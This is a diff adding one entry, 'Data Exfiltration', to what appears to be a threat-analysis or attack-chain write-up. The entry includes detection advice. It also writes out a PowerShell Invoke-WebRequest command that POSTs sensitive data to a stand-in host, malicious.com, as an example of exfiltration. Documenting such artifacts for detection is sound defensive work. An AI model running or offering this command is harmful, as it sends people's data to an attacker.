@@ -1,0 +1,7 @@
+
+   8. **Data Exfiltration**
+      - Application: PowerShell
+      - User Action: The payload sends sensitive data back to the command and control server.
+      - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/exfil -Method POST -Body "sensitive_data"`.
+      - Detection: Monitor for unusual outbound HTTP/S traffic patterns, especially POST requests with sensitive data.
+   
